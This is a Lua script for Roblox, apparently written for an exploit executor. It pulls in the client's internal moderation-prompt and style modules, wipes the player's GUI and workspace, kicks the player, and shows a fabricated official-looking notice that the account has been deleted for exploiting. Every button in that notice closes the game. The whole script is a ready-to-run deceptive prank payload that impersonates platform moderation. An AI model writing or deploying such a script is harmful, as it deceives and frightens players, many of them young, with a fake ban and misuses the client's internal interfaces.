local lplr = game:GetService("Players").LocalPlayer
task.spawn(function()
    local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
    local Roact = getrenv().require(game:GetService("CorePackages").Roact)
    UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
    local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
    local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
    local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
    local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
    local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
    lplr.PlayerGui:ClearAllChildren()
    game:GetService("CoreGui"):ClearAllChildren()
    for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
    task.wait(0.2)
    lplr:Kick()
    game:GetService("GuiService"):ClearError()
    task.wait(2)
    local gui = Instance.new("ScreenGui")
    gui.IgnoreGuiInset = true
    gui.Parent = game:GetService("CoreGui")
    local frame = Instance.new("Frame")
    frame.BorderSizePixel = 0
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.new(1, 1, 1)
    frame.Parent = gui
    task.delay(0.1, function()
        frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    end)
    task.delay(2, function()
        local e = Roact.createElement(auth, {
            style = {},
            screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
            moderationDetails = {
                punishmentTypeDescription = "Delete",
                beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
                reactivateAccountActivated = true,
                badUtterances = {},
                messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
            },
            termsActivated = function() 
                game:Shutdown()
            end,
            communityGuidelinesActivated = function() 
                game:Shutdown()
            end,
            supportFormActivated = function() 
                game:Shutdown()
            end,
            reactivateAccountActivated = function() 
                game:Shutdown()
            end,
            logoutCallback = function()
                game:Shutdown()
            end,
            globalGuiInset = {
                top = 0
            }
        })
        local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
                localization = tLocalization.mock()
            }, {Roact.createElement(UIBlox.Style.Provider, {
                    style = {
                        Theme = darktheme,
                        Font = gotham
                    },
                }, {e})}))
        Roact.mount(screengui, game:GetService("CoreGui"))
    end)
end)